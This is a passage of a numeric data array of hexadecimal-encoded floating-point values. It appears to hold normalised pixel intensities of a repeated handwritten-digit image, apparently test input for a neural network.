0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d989899, 0x3f5dddde, 0x3f7efeff, 0x3f26a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c40c0c1, 0x3f4bcbcc, 0x3f7efeff, 0x3f5bdbdc, 0x3e0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e189899, 0x3f7efeff, 0x3f7efeff, 0x3e9a9a9b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3df8f8f9, 0x3f60e0e1, 0x3f7efeff, 0x3ee6e6e7, 0x3b808081, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f7efeff, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea8a8a9, 0x3f39b9ba, 0x3f1f9fa0, 0x3f179798, 0x3e70f0f1, 0x3e109091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f5ededf, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f71f1f2, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f46c6c7, 0x3f2aaaab, 0x3e50d0d1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e868687, 0x3ee4e4e5, 0x3e909091, 0x3ee4e4e5, 0x3f23a3a4, 0x3f63e3e4, 0x3f7efeff, 0x3f61e1e2, 0x3f7efeff, 0x3f7efeff, 0x3f7efeff, 0x3f7afafb, 0x3f65e5e6, 0x3f7efeff, 0x3f7efeff, 0x3f0c8c8d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d888889, 0x3e848485, 0x3d60e0e1, 0x3e868687, 0x3e868687, 0x3e868687, 0x3e6ceced, 0x3da8a8a9, 0x3f6ceced, 0x3f7efeff, 0x3ed4d4d5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3ea6a6a7, 0x3f7dfdfe, 0x3f51d1d2, 0x3d909091, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3db0b0b1, 0x3f69e9ea, 0x3f800000, 0x3ea6a6a7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f018182, 0x3f7efeff, 0x3f6eeeef, 0x3e30b0b1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e6ceced, 0x3f79f9fa, 0x3f7efeff, 0x3e78f8f9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3f058586, 0x3f7efeff, 0x3f3bbbbc, 0x3ca0a0a1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3d109091, 0x3f4dcdce, 0x3f78f8f9, 0x3e68e8e9, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3efcfcfd, 0x3f7efeff, 0x3f36b6b7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3e969697, 0x3f7bfbfc, 0x3f70f0f1, 0x3e64e4e5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 